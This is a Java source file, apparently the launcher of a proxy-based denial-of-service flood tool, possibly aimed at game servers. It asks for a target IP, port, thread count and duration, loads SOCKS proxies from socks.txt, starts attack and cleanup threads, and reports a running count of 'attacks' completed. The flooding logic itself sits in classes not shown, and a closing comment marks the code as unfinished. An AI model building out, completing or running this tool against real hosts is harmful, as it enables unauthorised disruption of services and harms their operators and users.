package top.mhcraft;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Scanner;
public class Mains {
	@SuppressWarnings("static-access")
	public static void main(String[] args) {
		String ip = null;
		int th = 0;
		int port = 0;
		int time=0;
		Configs c=new Configs();
		c.setRunning(true);
		Scanner s=new Scanner(System.in);
		System.out.println("ip:");
		ip=s.next();
		System.out.println("port:");
		port=s.nextInt();
		System.out.println("Thread:");
		th=s.nextInt();
		System.out.println("Time:");
		time=s.nextInt();
		File f=new File("socks.txt");
		s.close();
		/*
		 * 读取socks.txt文件
		 */
		try {
			FileInputStream fi=new FileInputStream(f);
			InputStreamReader in=new InputStreamReader (fi);
			BufferedReader bf=new BufferedReader (in);
			String socks;
			ArrayList<String > list=new ArrayList<String >();
			while ((socks=bf.readLine())!=null){
				list.add(socks);
			}
			tools t=new tools();
			t.Update(list);
			bf.close();
		} catch (FileNotFoundException e) {
			try {
				f.createNewFile();
			} catch (IOException e1) {
				// TODO 自动生成的 catch 块
				e1.printStackTrace();
			}
			
		} catch (IOException e) {
			// TODO 自动生成的 catch 块
			e.printStackTrace();
		}
		//启动监听线程
		
		System.out.println(ip+" "+port+" "+th);
		Thread lt=new Thread(new ListenThread(ip,port,th));
		lt.start();
		System.out.println("监听线程创建成功");
		Thread ct=new Thread(new ClearThread(time));
		ct.start();
		System.out.println("清理线程创建成功");
		tools t=new tools();
		while(true){
			try {
				Thread.sleep(10000);
				System.out.println("已经完成"+t.getTimes()+"次攻击");
			} catch (InterruptedException e) {
				// TODO 自动生成的 catch 块
				e.printStackTrace();
			}
		}
	}
	
}
		
		
		
		/*
		 * 未完成
		 * map内容填充
		 * 构造器
		 * 
		 * 
		 * 
		 * 
		 */

